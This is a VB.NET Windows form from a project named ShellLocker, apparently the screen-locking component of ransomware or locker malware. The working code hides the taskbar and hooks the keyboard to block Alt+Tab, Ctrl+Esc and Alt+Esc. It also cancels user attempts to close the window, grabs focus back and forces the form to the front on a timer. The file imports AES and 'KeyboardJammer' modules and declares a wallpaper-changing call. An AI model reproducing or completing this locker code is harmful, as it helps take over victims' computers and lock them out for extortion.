Option Explicit On
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices
Imports ShellLocker.My
Imports ShellLocker.AES
Imports System.Net
Imports ShellLocker.Desktop
Imports ShellLocker.KeyboardJammer
Imports Microsoft.VisualBasic.FileIO
Imports System.Reflection

Public Class Form2
    Protected Overrides ReadOnly Property CreateParams() As CreateParams
        Get
            Dim cp As CreateParams = MyBase.CreateParams
            Const CS_NOCLOSE As Integer = &H200
            cp.ClassStyle = cp.ClassStyle Or CS_NOCLOSE
            Return cp
        End Get
    End Property

#Region "Taskbar"
    Private Declare Auto Function FindWindow Lib "user32" (
    ByVal lpClassName As String, ByVal lpWindowName As String) As Integer
    Private Declare Auto Sub SetWindowPos Lib "User32" (
    ByVal hWnd As Integer,
    ByVal hWndInsertAfter As Integer,
    ByVal X As Integer,
    ByVal Y As Integer,
    ByVal cx As Integer,
    ByVal cy As Integer,
    ByVal wFlags As Integer)
    Public Sub TaskBarVisible(ByVal Visible As Boolean)
        Dim Handle As Integer = FindWindow("Shell_TrayWnd", "")
        If Visible = True Then
            SetWindowPos(Handle, 0, 0, 0, 0, 0, 64)
        Else
            SetWindowPos(Handle, 0, 0, 0, 0, 0, 128)
        End If
    End Sub
#End Region

#Region "Disable"
    'disable  alt+tab and ctrl+esc  and alt esc system keys
    Private Declare Function UnhookWindowsHookEx Lib "user32" (ByVal hHook As Integer) As Integer

    Public Declare Function SetWindowsHookEx Lib "user32" _
      Alias "SetWindowsHookExA" (ByVal idHook As Integer,
      ByVal lpfn As KeyboardHookDelegate, ByVal hmod As Integer,
      ByVal dwThreadId As Integer) As Integer

    Private Declare Function GetAsyncKeyState2 Lib "user32" _
      (ByVal vKey As Integer) As Integer

    Private Declare Function CallNextHookEx Lib "user32" _
      (ByVal hHook As Integer,
      ByVal nCode As Integer,
      ByVal wParam As Integer,
      ByVal lParam As KBDLLHOOKSTRUCT) As Integer

    Public Structure KBDLLHOOKSTRUCT

        Public vkCode As Integer
        Public scanCode As Integer
        Public flags As Integer
        Public time As Integer
        Public dwExtraInfo As Integer

    End Structure

    ' Low-Level Keyboard Constants
    Private Const HC_ACTION As Integer = 0
    Private Const LLKHF_EXTENDED As Integer = &H1
    Private Const LLKHF_INJECTED As Integer = &H10
    Private Const LLKHF_ALTDOWN As Integer = &H20
    Private Const LLKHF_UP As Integer = &H80

    ' Virtual Keys
    Public Const VK_TAB = &H9
    Public Const VK_CONTROL = &H11
    Public Const VK_ESCAPE = &H1B
    Public Const VK_DELETE = &H2E
    Public Const VK_MENU = &H12

    Private Const WH_KEYBOARD_LL As Integer = 13&
    Public KeyboardHandle As Integer

    ' Implement this function to block as many
    ' key combinations as you'd like
    Public Function IsHooked(
      ByRef Hookstruct As KBDLLHOOKSTRUCT) As Boolean

        If (Hookstruct.vkCode = VK_ESCAPE) And
     CBool(GetAsyncKeyState(VK_CONTROL) _
     And &H8000) Then

            Call HookedState("Ctrl + Esc blocked")
            Return True
        End If

        If (Hookstruct.vkCode = VK_TAB) And
          CBool(Hookstruct.flags And
          LLKHF_ALTDOWN) Then

            Call HookedState("Alt + Tab blockd")
            Return True
        End If

        If (Hookstruct.vkCode = VK_ESCAPE) And
          CBool(Hookstruct.flags And
            LLKHF_ALTDOWN) Then

            Call HookedState("Alt + Escape blocked")
            Return True
        End If

        Return False

    End Function

    Private Sub HookedState(ByVal Text As String)

        Debug.WriteLine(Text)

    End Sub

    Public Function KeyboardCallback(ByVal Code As Integer,
      ByVal wParam As Integer,
      ByRef lParam As KBDLLHOOKSTRUCT) As Integer

        If (Code = HC_ACTION) Then
            Debug.WriteLine("Calling IsHooked")

            If (IsHooked(lParam)) Then
                Return 1
            End If

        End If

        Return CallNextHookEx(KeyboardHandle,
          Code, wParam, lParam)

    End Function

    Public Delegate Function KeyboardHookDelegate(
      ByVal Code As Integer,
      ByVal wParam As Integer, ByRef lParam As KBDLLHOOKSTRUCT) _
                   As Integer

    <MarshalAs(UnmanagedType.FunctionPtr)>
    Private callback As KeyboardHookDelegate

    Public Sub HookKeyboard()

        callback = New KeyboardHookDelegate(AddressOf KeyboardCallback)

        KeyboardHandle = SetWindowsHookEx(
          WH_KEYBOARD_LL, callback,
          Marshal.GetHINSTANCE(
          [Assembly].GetExecutingAssembly.GetModules()(0)).ToInt32, 0)

        Call CheckHooked()

    End Sub

    Public Sub CheckHooked()

        If (Hooked()) Then
            Debug.WriteLine("Keyboard hooked")
        Else
            Debug.WriteLine("Keyboard hook failed: " & Err.LastDllError)
        End If

    End Sub

    Private Function Hooked()

        Hooked = KeyboardHandle <> 0

    End Function

    Public Sub UnhookKeyboard()

        If (Hooked()) Then
            Call UnhookWindowsHookEx(KeyboardHandle)
        End If

    End Sub

    Private Sub Form2_LostFocus(ByVal sender As Object, ByVal e As System.EventArgs) Handles MyBase.LostFocus

        Me.Focus() ' when form object loses focus (another form, control, or program - form always has focus)

    End Sub

#End Region

    Declare Sub keybd_event Lib "user32" (ByVal bVk As Byte, ByVal bScan As Byte,
ByVal dwFlags As Long, ByVal dwExtraInfo As Long)
    Public Const VK_LWIN = &H5B
    Public Const KEYEVENTF_KEYUP = &H2

    Dim i As Integer
    Dim i2 As Integer
    Dim i3 As Integer
    Dim i4 As Integer
    Dim i5 As Integer

    Dim Location As String

    Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer

    Private Const SETDESKWALLPAPER = 20
    Private Const UPDATEINIFILE = &H1
    Private Declare Ansi Function GetAsyncKeyState Lib "user32" (vkey As Integer) As Integer
    Private erhaltenerText As RichTextBox

    Private path1 As String

    Private path2 As String

    Private userDir As Object

    Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

    Private Sub Form2_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles MyBase.Load


    End Sub

    Private Sub Form2_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        If (e.CloseReason = CloseReason.UserClosing) Then
            e.Cancel = True
        End If
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Me.BringToFront() 'top in zorder, other apps move to the back
    End Sub
End Class